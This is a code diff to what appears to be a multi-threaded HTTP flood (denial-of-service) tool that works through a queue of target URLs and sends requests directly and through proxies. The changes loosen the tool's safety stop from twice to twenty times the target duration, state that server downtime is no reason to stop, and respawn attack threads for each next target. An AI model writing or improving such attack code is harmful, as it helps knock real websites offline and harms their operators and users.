@@ -581,20 +581,18 @@ continueAttack = state.continueAttack;
 currentTarget = state.currentTarget;
 totalRequestsSent = state.totalRequests || 0;
 totalEffectiveMs = state.totalEffectiveMs || 0;
-targetQueue = state.queue || [];
-
-if (currentTarget) {
-  // On restart, check both wall-clock (hard stop) and effective time
-  // If effective time already met, skip this target
-  if (totalEffectiveMs >= currentTarget.duration) {
-    console.log(colors.yellow(`Target already completed effective time: ${currentTarget.url}`));
-    currentTarget = null;
-  } else if (currentTarget.startTime && Date.now() - currentTarget.startTime > currentTarget.duration * 2) {
-    // Wall-clock exceeded 2x duration — target is stale
-    console.log(colors.yellow(`Target wall-clock expired: ${currentTarget.url}`));
-    currentTarget = null;
+targetQueue = state.queue || [];  if (currentTarget) {
+    // On restart, check if effective time already met
+    // Wall-clock is NOT checked — server downtime is not a reason to stop.
+    if (totalEffectiveMs >= currentTarget.duration) {
+      console.log(colors.yellow(`Target already completed effective time: ${currentTarget.url}`));
+      currentTarget = null;
+    } else if (currentTarget.startTime && Date.now() - currentTarget.startTime > currentTarget.duration * 20) {
+      // Safety: 20x duration wall-clock exceeded — target is stale
+      console.log(colors.yellow(`Target wall-clock expired: ${currentTarget.url}`));
+      currentTarget = null;
+    }
   }
-}
 if (!currentTarget && targetQueue.length > 0) {
   currentTarget = targetQueue.shift();
   console.log(colors.green(`Starting next target from queue: ${currentTarget.url}`));
@@ -792,11 +790,35 @@ const performAttackSingle = async (target, ctx, threadId, isDirect) => {
       if (targetQueue.length > 0) {
         currentTarget = targetQueue.shift();
         console.log(colors.green(`Starting next target from queue: ${currentTarget.url}`));
+        const nextTarget = currentTarget;
         resetTotal();
         totalEffectiveMs = 0;
         lastProductiveCheckCount = 0;
-        state = { continueAttack, currentTarget, totalRequests: totalRequestsSent, queue: targetQueue, totalEffectiveMs: 0 };
+        state = { continueAttack, currentTarget: nextTarget, totalRequests: totalRequestsSent, queue: targetQueue, totalEffectiveMs: 0 };
         saveNow();
+        currentTarget = nextTarget;
+        // Clear old thread backoff states — new threads start fresh
+        threadBackoff.clear();
+        // Spawn new threads for the next target — existing threads stop naturally
+        const proxies = loadProxies();
+        let nextThreadId = 0;
+        if (!proxies.length) {
+          for (let i = 0; i < numThreads; i++) {
+            if (!continueAttack) break;
+            performAttackSingle(nextTarget, { type: "direct" }, nextThreadId++, true);
+          }
+        } else {
+          const directCount = Math.floor(numThreads / 2);
+          for (let i = 0; i < directCount; i++) {
+            if (!continueAttack) break;
+            performAttackSingle(nextTarget, { type: "direct" }, nextThreadId++, true);
+          }
+          for (let i = 0; i < numThreads - directCount; i++) {
+            if (!continueAttack) break;
+            performAttackSingle(nextTarget, createContext(getRandomElement(proxies)), nextThreadId++, false);
+          }
+        }
+        console.log(colors.green(`Spawned ${nextThreadId} threads for: ${nextTarget.url}`));
       } else {
         continueAttack = false;
         currentTarget = null;
@@ -809,15 +831,40 @@ const performAttackSingle = async (target, ctx, threadId, isDirect) => {
       return;
     }
 
-    // Safety fallback: if wall-clock exceeds 2x duration, force-stop to prevent infinite run
-    if (Date.now() - target.startTime > target.duration * 2) {
-      console.log(colors.yellow(`[Safety] Wall-clock ${Math.round((Date.now()-target.startTime)/60000)}min exceeded 2x target duration — force stopping`));
+    // Safety fallback: if wall-clock exceeds 20x duration (e.g. 80 hours for a 4h target),
+    // force-stop to prevent truly infinite runs in case of a bug. Under normal conditions
+    // this will never fire — server downtime should not count toward the attack duration.
+    if (Date.now() - target.startTime > target.duration * 20) {
+      console.log(colors.yellow(`[Safety] Wall-clock ${Math.round((Date.now()-target.startTime)/60000)}min exceeded 20x target duration — force stopping`));
       if (targetQueue.length > 0) {
         currentTarget = targetQueue.shift();
+        const nextTarget = currentTarget;
         resetTotal();
         totalEffectiveMs = 0;
-        state = { continueAttack, currentTarget, totalRequests: totalRequestsSent, queue: targetQueue, totalEffectiveMs: 0 };
+        state = { continueAttack, currentTarget: nextTarget, totalRequests: totalRequestsSent, queue: targetQueue, totalEffectiveMs: 0 };
         saveNow();
+        currentTarget = nextTarget;
+        // Clear old thread backoff states — new threads start fresh
+        threadBackoff.clear();
+        const proxies = loadProxies();
+        let nextThreadId = 0;
+        if (!proxies.length) {
+          for (let i = 0; i < numThreads; i++) {
+            if (!continueAttack) break;
+            performAttackSingle(nextTarget, { type: "direct" }, nextThreadId++, true);
+          }
+        } else {
+          const directCount = Math.floor(numThreads / 2);
+          for (let i = 0; i < directCount; i++) {
+            if (!continueAttack) break;
+            performAttackSingle(nextTarget, { type: "direct" }, nextThreadId++, true);
+          }
+          for (let i = 0; i < numThreads - directCount; i++) {
+            if (!continueAttack) break;
+            performAttackSingle(nextTarget, createContext(getRandomElement(proxies)), nextThreadId++, false);
+          }
+        }
+        console.log(colors.green(`Spawned ${nextThreadId} threads for: ${nextTarget.url}`));
       } else {
         continueAttack = false;
         currentTarget = null;
